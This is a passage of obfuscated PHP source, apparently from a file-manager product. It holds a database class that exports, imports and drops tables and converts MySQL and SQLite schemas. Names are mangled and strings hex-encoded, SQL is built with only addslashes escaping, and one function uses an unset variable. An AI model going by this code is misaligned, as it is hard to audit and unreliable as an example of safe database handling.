$this->parseGroup(!empty($ªå„ŒúŒ[$õÛûÕ·ú[517]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[517]] : $õÛûÕ·ú[12]), $this->parseHaving(!empty($ªå„ŒúŒ[$õÛûÕ·ú[1038]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[1038]] : $õÛûÕ·ú[12]), $this->parseOrder(!empty($ªå„ŒúŒ[$õÛûÕ·ú[371]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[371]] : $õÛûÕ·ú[12]), $this->parseLimit(!empty($ªå„ŒúŒ[$õÛûÕ·ú[298]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[298]] : $õÛûÕ·ú[12]), $this->parseUnion(!empty($ªå„ŒúŒ[$õÛûÕ·ú[353]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[353]] : $õÛûÕ·ú[12]), $this->parseComment(!empty($ªå„ŒúŒ[$õÛûÕ·ú[360]]) ? $ªå„ŒúŒ[$õÛûÕ·ú[360]] : $õÛûÕ·ú[12])), $œã‚‰ù); return $œã‚‰ù; } public function getLastSql($íî´Ê³‚ = '') { return $íî´Ê³‚ ? $this->modelSql[$íî´Ê³‚] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ë¡å‚È) { return addslashes($ë¡å‚È); } public function setModel($Üëİ€‹ó) { $this->model = $Üëİ€‹ó; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ş€¶¦ïØ = array()) { $ÆÀ“ë… =& $_SERVER[ë¦»ºéÌ]; if (empty($ş€¶¦ïØ)) { $ş€¶¦ïØ = $GLOBALS[$ÆÀ“ë…[6]][$ÆÀ“ë…[31]]; } $this->database = $ş€¶¦ïØ; } public function model($Ô·è’ùœ = '') { return new ModelBase($Ô·è’ùœ, $_SERVER[ë¦»ºéÌ][12], $this->database); } public function db($ä·…Íİ© = false) { $Ù„ôÛüÂ =& $_SERVER[ë¦»ºéÌ]; $ºíó«— = array_change_key_case($this->database); if ($this->dbType() == $Ù„ôÛüÂ[23] || !$ä·…Íİ©) { return $this->model()->db(); } $”¾íŒ = $ºíó«—[$Ù„ôÛüÂ[952]]; $ºíó«—[$Ù„ôÛüÂ[952]] = $Ù„ôÛüÂ[12]; if ($ºíó«—[$Ù„ôÛüÂ[947]] == $Ù„ôÛüÂ[944]) { $§ƒ’‰ü = $ºíó«—[$Ù„ôÛüÂ[953]]; $ºíó«—[$Ù„ôÛüÂ[953]] = substr($§ƒ’‰ü, 0, strrpos($§ƒ’‰ü, $Ù„ôÛüÂ[1039])); } $this->database = $ºíó«—; $òûê®§« = $this->model()->db(); try { $‹çº•í… = $òûê®§«->execute("\163\150\x6f\x77\x20\x64\141\164\x61\142\x61\163\145\x73\40\154\151\153\145\x20\47{$”¾íŒ}\x27"); } catch (Exception $ã¤ıó¾) { } if (!$‹çº•í…) { $òûê®§«->execute("\143\x72\145\141\164\145\40\x64\x61\x74\x61\142\x61\163\145\x20\140{$”¾íŒ}\x60"); } $ºíó«—[$Ù„ôÛüÂ[952]] = $”¾íŒ; if ($ºíó«—[$Ù„ôÛüÂ[947]] == $Ù„ôÛüÂ[944]) { $ºíó«—[$Ù„ôÛüÂ[953]] .= $Ù„ôÛüÂ[1039] . $”¾íŒ; } $this->database = $ºíó«—; $òûê®§«->execute("\165\x73\x65\40\140{$”¾íŒ}\140"); return $òûê®§«; } public function createTable($ƒ”ëòĞë, &$±ÙêÆå•) { $¶òƒˆ¿ =& $_SERVER[ë¦»ºéÌ]; if (!IO::exist($ƒ”ëòĞë)) { ActionCall($¶òƒˆ¿[1040], !0, 0); show_json(LNG($¶òƒˆ¿[1041]), !1); } $è¢¹Šµú = $this->model()->db(); $ÌØğâå¡ = sqlSplit(IO::getContent($ƒ”ëòĞë)); foreach ($ÌØğâå¡ as $áÔéæ©) { $œïŞ§ä = stripos($áÔéæ©, $¶òƒˆ¿[1042]) === 0; if ($œïŞ§ä) { $±ÙêÆå•->task[$¶òƒˆ¿[770]] += 1; } $è¢¹Šµú->execute($áÔéæ©); if ($œïŞ§ä) { preg_match($¶òƒˆ¿[1043], $áÔéæ©, $’¡Ã¤’); $±ÙêÆå•->task[$¶òƒˆ¿[1044]] = $’¡Ã¤’[1]; $±ÙêÆå•->update(1); } } } public function insertTable($•Á¯Éµ, &$åøĞ±İÁ) { $óÁ¼…µ =& $_SERVER[ë¦»ºéÌ]; $Š­ß³»Í = $this->model()->db(); $ı•¼£Ş³ = $Ÿ¨ç«à‘ ? array($Ÿ¨ç«à‘) : $Š­ß³»Í->getTables(); foreach ($•Á¯Éµ as $‡ı­¼Æù) { $Ÿ¨ç«à‘ = basename($‡ı­¼Æù, $óÁ¼…µ[772]); if (!in_array($Ÿ¨ç«à‘, $ı•¼£Ş³)) { continue; } $åøĞ±İÁ->task[$óÁ¼…µ[1044]] = $Ÿ¨ç«à‘; if (get_filesize($‡ı­¼Æù) == 0) { continue; } $»§×“© = $this->sqlToDb($‡ı­¼Æù, $åøĞ±İÁ); if (!$»§×“©) { ActionCall($óÁ¼…µ[1040], !0, 0); show_json(LNG($óÁ¼…µ[1045]) . "\133{$Ÿ¨ç«à‘}\x5d", !1); } } } public function sqlFromDb($°Óô‡ºâ, $´ÂÑÎ—¹, &$¬¥ûÜ¢Ë, $ñÖËæÄÑ = '') { if ($¬¥ûÜ¢Ë) { $¬¥ûÜ¢Ë->task[$_SERVER[ë¦»ºéÌ][1044]] = $°Óô‡ºâ; } $Õ’ôëØ‚ = $this->model($°Óô‡ºâ); $°ôÓÓ±ò = 0; $Ş”¾§Ş = 0; $¸—Ìˆ´‚ = 10000; $Êï¥Ì˜• = fopen($´ÂÑÎ—¹, $_SERVER[ë¦»ºéÌ][1046]); $ğÌ÷®Å = $Õ’ôëØ‚->getPk(); $µÉş„ = $Õ’ôëØ‚->getDbFields(); $Ÿ½â›ë = $_SERVER[ë¦»ºéÌ][12]; if ($GLOBALS[$_SERVER[ë¦»ºéÌ][771]] && in_array($°Óô‡ºâ, array($_SERVER[ë¦»ºéÌ][1047], $_SERVER[ë¦»ºéÌ][1048]))) { $Ÿ½â›ë = $°Óô‡ºâ; } do { $µ‘ÂœÆ£ = array($ğÌ÷®Å => array($_SERVER[ë¦»ºéÌ][994], $Ş”¾§Ş)); $±•öôä¼ = $Õ’ôëØ‚->where($µ‘ÂœÆ£)->field($µÉş„)->order($ğÌ÷®Å . $_SERVER[ë¦»ºéÌ][1049])->limit($¸—Ìˆ´‚)->select(); $±•öôä¼ = !empty($±•öôä¼) ? $±•öôä¼ : array(); if (!($ÈàèÂª± = count($±•öôä¼))) { break; } $ƒ­äÛÔç = end($±•öôä¼); $Ş”¾§Ş = $ƒ­äÛÔç[$ğÌ÷®Å]; $ˆ‹«¯Ã = array(); foreach ($±•öôä¼ as $À•õˆìì) { if ($Ÿ½â›ë) { if ($°Óô‡ºâ == $_SERVER[ë¦»ºéÌ][1047]) { if ($À•õˆìì[$_SERVER[ë¦»ºéÌ][43]] == $_SERVER[ë¦»ºéÌ][1050]) { $ÌÖè„¬± = json_decode($À•õˆìì[$_SERVER[ë¦»ºéÌ][380]], !0); if ($ÌÖè„¬±[$_SERVER[ë¦»ºéÌ][42]] == $GLOBALS[$_SERVER[ë¦»ºéÌ][771]] && $ÌÖè„¬±[$_SERVER[ë¦»ºéÌ][734]] != 1) { continue; } } } else { if ($À•õˆìì[$_SERVER[ë¦»ºéÌ][43]] == $_SERVER[ë¦»ºéÌ][1051] && $À•õˆìì[$_SERVER[ë¦»ºéÌ][105]] == $_SERVER[ë¦»ºéÌ][763]) { continue; } } } if ($ñÖËæÄÑ) { $À•õˆìì[$_SERVER[ë¦»ºéÌ][88]] = "\x7b\151\157\x3a{$ñÖËæÄÑ}\x7d" . substr($À•õˆìì[$_SERVER[ë¦»ºéÌ][88]], strlen("\173\151\x6f\x3a{$À•õˆìì[$_SERVER[ë¦»ºéÌ][801]]}\x7d")); $À•õˆìì[$_SERVER[ë¦»ºéÌ][801]] = $ñÖËæÄÑ; } $ˆ‹«¯Ã[] = $_SERVER[ë¦»ºéÌ][1052] . $this->sqlEncode($À•õˆìì) . $_SERVER[ë¦»ºéÌ][1053]; } $Îƒ’‘’ñ = "\x49\x4e\x53\x45\x52\x54\40\x49\x4e\124\x4f\40\140{$°Óô‡ºâ}\140\40\50\140" . implode($_SERVER[ë¦»ºéÌ][1054], $µÉş„) . $_SERVER[ë¦»ºéÌ][1055]; fwrite($Êï¥Ì˜•, $Îƒ’‘’ñ . implode($_SERVER[ë¦»ºéÌ][1056], $ˆ‹«¯Ã) . $_SERVER[ë¦»ºéÌ][81] . PHP_EOL); $°ôÓÓ±ò += $ÈàèÂª±; if ($¬¥ûÜ¢Ë) { $¬¥ûÜ¢Ë->update($ÈàèÂª±); } } while ($¸—Ìˆ´‚ == $ÈàèÂª±); fclose($Êï¥Ì˜•); return $°ôÓÓ±ò; } public function sqlToDb($ò–‰³¡, &$¦†ÙÃí¯) { $çÀ—†òÕ =& $_SERVER[ë¦»ºéÌ]; $øÆ¤Æğâ = $this->model()->db(); $â’Úê« = @fopen($ò–‰³¡, $çÀ—†òÕ[1057]); if (!$â’Úê«) { return !1; } $«¯Ÿ¿ö = 0; $«ûÔ·¥ˆ = $çÀ—†òÕ[12]; $¶â‡êÒ = array(); $·êŠÂ¯Š = $this->dbType(); $ÉË±™ï– = $·êŠÂ¯Š == $çÀ—†òÕ[23] ? 500 : 2000; $î±ª¸« = basename($ò–‰³¡, $çÀ—†òÕ[772]); $‹ğÂ‚˜œ = 0; $õßÁø†î = 4194304 - 104858; $ô´ºäüï = 1000000 - 104858; while (!feof($â’Úê«)) { $´üŠŸÅ© = trim(fgets($â’Úê«)); if (!$´üŠŸÅ©) { continue; } $¢Î‰ŠÆÓ = $this->sqlDecode($´üŠŸÅ©, $·êŠÂ¯Š, $î±ª¸«); if (stripos($¢Î‰ŠÆÓ, $çÀ—†òÕ[361]) === 0) { if (!$«ûÔ·¥ˆ) { $«ûÔ·¥ˆ = $¢Î‰ŠÆÓ . $çÀ—†òÕ[63]; } continue; } if ($¦†ÙÃí¯) { $¦†ÙÃí¯->task[$çÀ—†òÕ[770]] += 1; } $«¯Ÿ¿ö++; $¶â‡êÒ[] = rtrim(rtrim(trim($¢Î‰ŠÆÓ), $çÀ—†òÕ[60]), $çÀ—†òÕ[81]); $ÊÊéÚ÷ = null; $¸ƒì½ûŸ = strlen($¢Î‰ŠÆÓ); $‹ğÂ‚˜œ += $¸ƒì½ûŸ; if ($‹ğÂ‚˜œ >= ($ÉË±™ï– == 500 ? $ô´ºäüï : $õßÁø†î)) { $ÊÊéÚ÷ = array_pop($¶â‡êÒ); if ($«¯Ÿ¿ö > 1) { $«¯Ÿ¿ö--; } } if ($«¯Ÿ¿ö >= $ÉË±™ï– || $ÊÊéÚ÷) { $¢Î‰ŠÆÓ = $«ûÔ·¥ˆ . implode($çÀ—†òÕ[60], $¶â‡êÒ); if (!$øÆ¤Æğâ->execute($¢Î‰ŠÆÓ)) { return !1; } if ($¦†ÙÃí¯) { $¦†ÙÃí¯->update($«¯Ÿ¿ö); } $¶â‡êÒ = array(); $«¯Ÿ¿ö = 0; $‹ğÂ‚˜œ = 0; if ($ÊÊéÚ÷) { $¶â‡êÒ = array($ÊÊéÚ÷); $«¯Ÿ¿ö = 1; $‹ğÂ‚˜œ = $¸ƒì½ûŸ; } } } fclose($â’Úê«); if (!empty($¶â‡êÒ)) { $¢Î‰ŠÆÓ = $«ûÔ·¥ˆ . implode($çÀ—†òÕ[60], $¶â‡êÒ); if (!$øÆ¤Æğâ->execute($¢Î‰ŠÆÓ)) { return !1; } if ($¦†ÙÃí¯) { $¦†ÙÃí¯->update($«¯Ÿ¿ö); } } return !0; } public function dropTable($Ä¹Ş«¨Á = null) { $ô½íé™ = $this->model()->db(); $œÊıœŞæ = $Ä¹Ş«¨Á ? array($Ä¹Ş«¨Á) : $ô½íé™->getTables(); if (!$œÊıœŞæ) { return; } foreach ($œÊıœŞæ as $Ä¹Ş«¨Á) { if ($Ä¹Ş«¨Á) { $Ä¹Ş«¨Á = strtolower($Ä¹Ş«¨Á); } else { continue; } $ô½íé™->execute("\x64\x72\157\x70\x20\164\141\142\154\145\x20\151\146\40\145\x78\x69\163\164\x73\40\x60{$Ä¹Ş«¨Á}\140"); } } private function sqlEncode($šÈİâú¡) { $Ê …­½Ù =& $_SERVER[ë¦»ºéÌ]; $Ë£Ò’Å = array(); foreach ($šÈİâú¡ as $áœ¿ŞŒë) { if (is_array($áœ¿ŞŒë)) { $áœ¿ŞŒë = json_encode_force($áœ¿ŞŒë); } $áœ¿ŞŒë = addslashes($áœ¿ŞŒë); $áœ¿ŞŒë = str_replace(array($Ê …­½Ù[1058], $Ê …­½Ù[18]), array($Ê …­½Ù[1059], $Ê …­½Ù[1060]), $áœ¿ŞŒë); $Ë£Ò’Å[] = str_replace($Ê …­½Ù[68], $Ê …­½Ù[1061], $áœ¿ŞŒë); } return $Ê …­½Ù[68] . implode($Ê …­½Ù[1062], $Ë£Ò’Å) . $Ê …­½Ù[68]; } private function sqlDecode($ãÃæ«ò‘, $Õàî°ãî, $ª–óø¤… = '') { $Âœ¬Çí® =& $_SERVER[ë¦»ºéÌ]; $ãÃæ«ò‘ = str_replace(array($Âœ¬Çí®[1059], $Âœ¬Çí®[1060]), array($Âœ¬Çí®[1058], $Âœ¬Çí®[18]), $ãÃæ«ò‘); if ($Õàî°ãî == $Âœ¬Çí®[23]) { return $ª–óø¤… != $Âœ¬Çí®[1063] ? stripslashes($ãÃæ«ò‘) : $ãÃæ«ò‘; } if ($ª–óø¤… == $Âœ¬Çí®[1063]) { $ãÃæ«ò‘ = str_replace($Âœ¬Çí®[1064], $Âœ¬Çí®[129], stripslashes($ãÃæ«ò‘)); } return $ãÃæ«ò‘; } public function getSqlFile($áëçÛ¨¤ = '') { $ãÁêÊš¶ =& $_SERVER[ë¦»ºéÌ]; $óÑ¿ªİì = $this->dbType(!0); $õÄ†îİô = CONTROLLER_DIR . "\x69\156\x73\164\x61\154\154\57\144\x61\164\141\57{$óÑ¿ªİì}\56\x73\x71\x6c"; $‰ÛÜØŞ = file_get_contents($õÄ†îİô); $Ã×óØ™¢ = $ãÁêÊš¶[1065] . ($óÑ¿ªİì == $ãÁêÊš¶[788] ? $ãÁêÊš¶[1066] : $ãÁêÊš¶[1067]) . $ãÁêÊš¶[1068]; preg_match_all($Ã×óØ™¢, $‰ÛÜØŞ, $Öï´Ğ ); $“­¼› = $Öï´Ğ [1]; $®ÓÎùÆ = $this->model()->db(); $»¼¨­â = $®ÓÎùÆ->getTables(); $è¾×¢±« = TEMP_FILES . $ãÁêÊš¶[1069] . date($ãÁêÊš¶[735]) . $ãÁêÊš¶[8]; del_dir($è¾×¢±«); mk_dir($è¾×¢±«); $¬Ò¸×› = $è¾×¢±« . $ãÁêÊš¶[1070]; $Êû Ê¶¥ = $è¾×¢±« . $ãÁêÊš¶[1071]; $şš¹ò» = $óÑ¿ªİì == $ãÁêÊš¶[23] ? $ãÁêÊš¶[788] : $ãÁêÊš¶[23]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\x6c\x2f\x64\x61\x74\x61\57{$şš¹ò»}\56\163\161\154", $è¾×¢±«); @touch($è¾×¢±« . $óÑ¿ªİì . $ãÁêÊš¶[772]); $é©œÄ¿ã = fopen($¬Ò¸×›, $ãÁêÊš¶[1046]); $É¤£úÆ¶ = fopen($Êû Ê¶¥, $ãÁêÊš¶[1046]); if ($óÑ¿ªİì == $ãÁêÊš¶[23]) { $»¼¨­â = array_diff($»¼¨­â, array($ãÁêÊš¶[768], $ãÁêÊš¶[769])); $Îì¨ıË = array($ãÁêÊš¶[1072], $ãÁêÊš¶[1073], $ãÁêÊš¶[1074]); fwrite($É¤£úÆ¶, implode(PHP_EOL, $Îì¨ıË) . PHP_EOL . PHP_EOL); foreach ($»¼¨­â as $ÃÌÁÒß) { $°‘òò‹ = $this->sqlFromSqlite($ÃÌÁÒß); if (!$°‘òò‹[$ãÁêÊš¶[23]]) { continue; } fwrite($É¤£úÆ¶, $°‘òò‹[$ãÁêÊš¶[23]] . PHP_EOL . PHP_EOL); if (!in_array($ÃÌÁÒß, $“­¼›)) { fwrite($é©œÄ¿ã, $°‘òò‹[$ãÁêÊš¶[788]] . PHP_EOL . PHP_EOL); } } } else { foreach ($»¼¨­â as $ÃÌÁÒß) { $°‘òò‹ = $this->sqlFromMysql($ÃÌÁÒß); if (!$°‘òò‹[$ãÁêÊš¶[788]]) { continue; } fwrite($é©œÄ¿ã, $°‘òò‹[$ãÁêÊš¶[788]] . PHP_EOL . PHP_EOL); if (!in_array($ÃÌÁÒß, $“­¼›)) { fwrite($É¤£úÆ¶, $°‘òò‹[$ãÁêÊš¶[23]] . PHP_EOL . PHP_EOL); } } } fclose($é©œÄ¿ã); fclose($É¤£úÆ¶); $‰ÛÜØŞ = array($ãÁêÊš¶[788] => $¬Ò¸×›, $ãÁêÊš¶[23] => $Êû Ê¶¥); return $áëçÛ¨¤ ? $‰ÛÜØŞ[$áëçÛ¨¤] : $‰ÛÜØŞ; } public function dbType($ù‡¬å¥ = false) { $»Êö€ïÜ =& $_SERVER[ë¦»ºéÌ]; $ÂÏşÎ¦¼ = $ù‡¬å¥ ? $GLOBALS[$»Êö€ïÜ[6]][$»Êö€ïÜ[31]] : $this->database; $ÂÏşÎ¦¼ = array_change_key_case($ÂÏşÎ¦¼); $ŸÖÆî‘± = $ÂÏşÎ¦¼[$»Êö€ïÜ[947]]; if ($ŸÖÆî‘± == $»Êö€ïÜ[944]) { $±÷ì­ö = explode($»Êö€ïÜ[4], $ÂÏşÎ¦¼[$»Êö€ïÜ[953]]); $ŸÖÆî‘± = $±÷ì­ö[0]; } $‘ãÂ­‚ = array($»Êö€ïÜ[1075] => $»Êö€ïÜ[23], $»Êö€ïÜ[892] => $»Êö€ïÜ[788]); if (isset($‘ãÂ­‚[$ŸÖÆî‘±])) { $ŸÖÆî‘± = $‘ãÂ­‚[$ŸÖÆî‘±]; } return $ŸÖÆî‘±; } public function sqlFromMysql($ĞÜçò“Ó, $òí¸Öş¤ = '') { $ÍäÖÚğ÷ =& $_SERVER[ë¦»ºéÌ]; $à·ôĞ£ù = $this->model()->db(); $Âë¸ëÂÔ = $à·ôĞ£ù->query($ÍäÖÚğ÷[1076] . $ĞÜçò“Ó . $ÍäÖÚğ÷[391]); if (!$Âë¸ëÂÔ || !$Âë¸ëÂÔ[0]) { return !1; } $ÃêØËÒ• = _get($Âë¸ëÂÔ[0], $ÍäÖÚğ÷[1077], $ÍäÖÚğ÷[12]); if (!$ÃêØËÒ•) { return !1; } $ªµà®ĞŒ = "\x44\x52\x4f\120\40\x54\x41\102\114\105\40\x49\106\x20\105\130\x49\123\124\123\40\x60{$ĞÜçò“Ó}\140\73" . PHP_EOL . $ÃêØËÒ• . $ÍäÖÚğ÷[81]; if ($òí¸Öş¤ && $òí¸Öş¤ == $ÍäÖÚğ÷[788]) { return $ªµà®ĞŒ; } $ŸÚÍ¿ã = array_change_key_case($GLOBALS[$ÍäÖÚğ÷[6]][$ÍäÖÚğ÷[31]]); $îèÙ’ıİ = $ŸÚÍ¿ã[$ÍäÖÚğ÷[952]]; $³ÒÁãõ¹ = $ÍäÖÚğ÷[1078] . $îèÙ’ıİ . $ÍäÖÚğ÷[1079] . $ĞÜçò“Ó . $ÍäÖÚğ÷[68]; $šÆ™˜á† = $ÍäÖÚğ÷[1080] . $ĞÜçò“Ó . $ÍäÖÚğ÷[880]; $îÅ÷©ïÊ = $à·ôĞ£ù->query($³ÒÁãõ¹); if (empty($îÅ÷©ïÊ)) { $ö¤ØôºÄ = array($ÍäÖÚğ÷[788] => $ÍäÖÚğ÷[12], $ÍäÖÚğ÷[23] => $ÍäÖÚğ÷[12]); return $òí¸Öş¤ ? $ö¤ØôºÄ[$òí¸Öş¤] : $ö¤ØôºÄ; } $×ĞÒ³ = $à·ôĞ£ù->query($šÆ™˜á†); $İàå‚­Ñ = $ÍäÖÚğ÷[12]; $÷‡¯õË = array(); foreach ($×ĞÒ³ as $ÉÃå¤‘¨) { if (!$İàå‚­Ñ && $ÉÃå¤‘¨[$ÍäÖÚğ÷[1081]] == $ÍäÖÚğ÷[1082]) { $İàå‚­Ñ = $ÉÃå¤‘¨[$ÍäÖÚğ÷[1083]]; } if (isset($÷‡¯õË[$ÉÃå¤‘¨[$ÍäÖÚğ÷[1081]]])) { $÷‡¯õË[$ÉÃå¤‘¨[$ÍäÖÚğ÷[1081]]][$ÍäÖÚğ÷[1084]][] = $ÉÃå¤‘¨[$ÍäÖÚğ÷[1083]]; continue; } $÷‡¯õË[$ÉÃå¤‘¨[$ÍäÖÚğ÷[1081]]] = array($ÍäÖÚğ÷[1085] => $ÉÃå¤‘¨[$ÍäÖÚğ÷[1081]], $ÍäÖÚğ÷[1084] => array($ÉÃå¤‘¨[$ÍäÖÚğ÷[1083]]), $ÍäÖÚğ÷[1086] => $ÉÃå¤‘¨[$ÍäÖÚğ÷[1087]] == $ÍäÖÚğ÷[99] ? 0 : 1); } $™áó†İË = array(); foreach ($÷‡¯õË as $ÉÃå¤‘¨) { $â›ê×Í« = $ÉÃå¤‘¨[$ÍäÖÚğ÷[1085]] == $ÍäÖÚğ÷[1082]; $˜’ãóïÀ = array($ÍäÖÚğ÷[1088], $ÉÃå¤‘¨[$ÍäÖÚğ÷[1086]] == $ÍäÖÚğ÷[99] && !$â›ê×Í« ? $ÍäÖÚğ÷[1089] : $ÍäÖÚğ÷[12], $ÍäÖÚğ÷[1090], $ÍäÖÚğ÷[1091] . $ĞÜçò“Ó . $ÍäÖÚğ÷[11] . ($â›ê×Í« ? $ÍäÖÚğ÷[1092] : $ÉÃå¤‘¨[$ÍäÖÚğ÷[1085]]) . $ÍäÖÚğ÷[129], $ÍäÖÚğ÷[1093], $ÍäÖÚğ÷[129] . $ĞÜçò“Ó . $ÍäÖÚğ÷[129], $ÍäÖÚğ÷[1094] . implode($ÍäÖÚğ÷[1095], $ÉÃå¤‘¨[$ÍäÖÚğ÷[1084]]) . $ÍäÖÚğ÷[1096]); $™áó†İË[] = implode($ÍäÖÚğ÷[63], $˜’ãóïÀ) . $ÍäÖÚğ÷[81]; } $é¥˜·ÅÅ = array(); $ù¥¶ÉÅ = array($ÍäÖÚğ÷[1097] => $ÍäÖÚğ÷[1098], $ÍäÖÚğ÷[1098] => $ÍäÖÚğ÷[1098], $ÍäÖÚğ÷[294] => $ÍäÖÚğ÷[321], $ÍäÖÚğ÷[293] => $ÍäÖÚğ÷[321]); foreach ($îÅ÷©ïÊ as $ÉÃå¤‘¨) { $˜’ãóïÀ = array($ÍäÖÚğ÷[129] . $ÉÃå¤‘¨[$ÍäÖÚğ÷[1099]] . $ÍäÖÚğ÷[129], isset($ù¥¶ÉÅ[$ÉÃå¤‘¨[$ÍäÖÚğ÷[1100]]]) ? $ù¥¶ÉÅ[$ÉÃå¤‘¨[$ÍäÖÚğ÷[1100]]] : $ÉÃå¤‘¨[$ÍäÖÚğ÷[1101]], $ÉÃå¤‘¨[$ÍäÖÚğ÷[1102]] == $ÍäÖÚğ÷[878] ? $ÍäÖÚğ÷[1103] : $ÍäÖÚğ÷[1104], $ÉÃå¤‘¨[$ÍäÖÚğ÷[1099]] == $İàå‚­Ñ ? $ÍäÖÚğ÷[1105] : $ÍäÖÚğ÷[12], $ÉÃå¤‘¨[$ÍäÖÚğ÷[929]] ? strtoupper(str_replace($ÍäÖÚğ÷[11], $ÍäÖÚğ÷[12], $ÉÃå¤‘¨[$ÍäÖÚğ÷[929]])) : $ÍäÖÚğ÷[12]); $é¥˜·ÅÅ[] = trim(implode($ÍäÖÚğ÷[63], $˜’ãóïÀ)); } $ìïÇç°€ = array($ÍäÖÚğ÷[1106] . $ĞÜçò“Ó . $ÍäÖÚğ÷[1107], $ÍäÖÚğ÷[1108] . $ĞÜçò“Ó . $ÍäÖÚğ÷[1109], implode($ÍäÖÚğ÷[60] . PHP_EOL, $é¥˜·ÅÅ), $ÍäÖÚğ÷[926]); $¿Âá®˜ = implode(PHP_EOL, array_merge($ìïÇç°€, $™áó†İË)); if ($òí¸Öş¤ && $òí¸Öş¤ == $ÍäÖÚğ÷[23]) { return $¿Âá®˜; } $ö¤ØôºÄ = array($ÍäÖÚğ÷[788] => $ªµà®ĞŒ, $ÍäÖÚğ÷[23] => $¿Âá®˜); return $òí¸Öş¤ ? $ö¤ØôºÄ[$òí¸Öş¤] : $ö¤ØôºÄ; } public function sqlFromSqlite($ëÛ¥öñ¢, $¾Â¡‹şÍ = '') { $ô—şî‰Ù =& $_SERVER[ë¦»ºéÌ]; $«±ï ˆğ = $this->model()->db(); $ìÎı¼¶¿ = "\120\122\101\x47\x4d\x41\x20\x54\x41\x42\114\105\x5f\111\x4e\106\117\40\x28\47{$ëÛ¥öñ¢}\47\51"; $ıÔ§Óµö = "\123\x45\114\105\103\x54\40\52\40\106\x52\117\x4d\x20\163\161\154\x69\x74\145\x5f\x6d\141\163\x74\x65\x72\x20\x57\x48\x45\x52\105\40\164\142\154\137\x6e\x61\x6d\x65\40\75\x20\x27{$ëÛ¥öñ¢}\x27"; $¹ı§©©· = $«±ï ˆğ->query($ìÎı¼¶¿); if (empty($¹ı§©©·)) { $Ô¹©±À = array($ô—şî‰Ù[788] => $ô—şî‰Ù[12], $ô—şî‰Ù[23] => $ô—şî‰Ù[12]); return $¾Â¡‹şÍ ? $Ô¹©±À[$¾Â¡‹şÍ] : $Ô¹©±À; } $‰í»›É® = $«±ï ˆğ->query($ıÔ§Óµö); $…½ó¡«Œ = $øş˜ûÊ½ = array(); foreach ($‰í»›É® as $ğ•ÁŠàÔ) { if ($ğ•ÁŠàÔ[$ô—şî‰Ù[43]] == $ô—şî‰Ù[285]) { $…½ó¡«Œ[] = $ğ•ÁŠàÔ[$ô—şî‰Ù[1110]]; } else { $øş˜ûÊ½[$ğ•ÁŠàÔ[$ô—şî‰Ù[42]]] = $ğ•ÁŠàÔ[$ô—şî‰Ù[1110]]; } } $°ùì¼Ï = array_merge(array($ô—şî‰Ù[1106] . $ëÛ¥öñ¢ . $ô—şî‰Ù[129]), $…½ó¡«Œ, array_values($øş˜ûÊ½)); $°ùì¼Ï = implode($ô—şî‰Ù[81] . PHP_EOL, $°ùì¼Ï) . $ô—şî‰Ù[81]; if ($¾Â¡‹şÍ && $¾Â¡‹şÍ == $ô—şî‰Ù[23]) { return $°ùì¼Ï; } $Êßì‹àâ = array(); $â¾œÍ± = array($ô—şî‰Ù[1098] => $ô—şî‰Ù[1111], $ô—şî‰Ù[321] => $ô—şî‰Ù[1112]); $ôüÕ†ÑÜ = $ô—şî‰Ù[12]; foreach ($¹ı§©©· as $ğ•ÁŠàÔ) { if ($ğ•ÁŠàÔ[$ô—şî‰Ù[67]] == $ô—şî‰Ù[99]) { $ôüÕ†ÑÜ = $ğ•ÁŠàÔ[$ô—şî‰Ù[42]]; } $ª ØÅ = array($ô—şî‰Ù[391] . $ğ•ÁŠàÔ[$ô—şî‰Ù[42]] . $ô—şî‰Ù[391], isset($â¾œÍ±[$ğ•ÁŠàÔ[$ô—şî‰Ù[43]]]) ? $â¾œÍ±[$ğ•ÁŠàÔ[$ô—şî‰Ù[43]]] : $ğ•ÁŠàÔ[$ô—şî‰Ù[43]], $ğ•ÁŠàÔ[$ô—şî‰Ù[45]] == $ô—şî‰Ù[99] ? $ô—şî‰Ù[1103] : $ô—şî‰Ù[1113] . $ğ•ÁŠàÔ[$ô—şî‰Ù[66]], $ğ•ÁŠàÔ[$ô—şî‰Ù[67]] == $ô—şî‰Ù[99] ? $ô—şî‰Ù[1114] : $ô—şî‰Ù[12]); $Êßì‹àâ[] = trim(implode($ô—şî‰Ù[63], $ª ØÅ)); } foreach ($øş˜ûÊ½ as $¯¤ø‡‹§ => $øÓ™Óıæ) { $÷®¿—ê— = str_replace($ô—şî‰Ù[1115] . $ëÛ¥öñ¢ . $ô—şî‰Ù[11], $ô—şî‰Ù[12], $¯¤ø‡‹§); $Ç¢ˆÙ = str_replace(array($ô—şî‰Ù[129], $ô—şî‰Ù[937]), $ô—şî‰Ù[391], substr($øÓ™Óıæ, stripos($øÓ™Óıæ, $ô—şî‰Ù[266]))); if ($÷®¿—ê— == $ô—şî‰Ù[1092]) { $ëºÏ•†Â = $ô—şî‰Ù[1116] . $ôüÕ†ÑÜ . $ô—şî‰Ù[1117]; } else { $ëºÏ•†Â = (stripos($÷®¿—ê—, $ô—şî‰Ù[11]) ? $ô—şî‰Ù[1118] : $ô—şî‰Ù[12]) . ($ô—şî‰Ù[1119] . $÷®¿—ê— . $ô—şî‰Ù[1120] . $Ç¢ˆÙ); } $Êßì‹àâ[] = $ëºÏ•†Â; } $ëÆÔæÑì = array($ô—şî‰Ù[1121] . $ëÛ¥öñ¢ . $ô—şî‰Ù[1122], $ô—şî‰Ù[1123] . $ëÛ¥öñ¢ . $ô—şî‰Ù[1124], implode($ô—şî‰Ù[60] . PHP_EOL, $Êßì‹àâ), $ô—şî‰Ù[1125]); $âãÄŒş« = implode(PHP_EOL, $ëÆÔæÑì); if ($¾Â¡‹şÍ && $¾Â¡‹şÍ == $ô—şî‰Ù[788]) { return $âãÄŒş«; } $Ô¹©±À = array($ô—şî‰Ù[788] => $âãÄŒş«, $ô—şî‰Ù[23] => $°ùì¼Ï); return $¾Â¡‹şÍ ? $Ô¹©±À[$¾Â¡‹şÍ] : $Ô¹©±À; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static 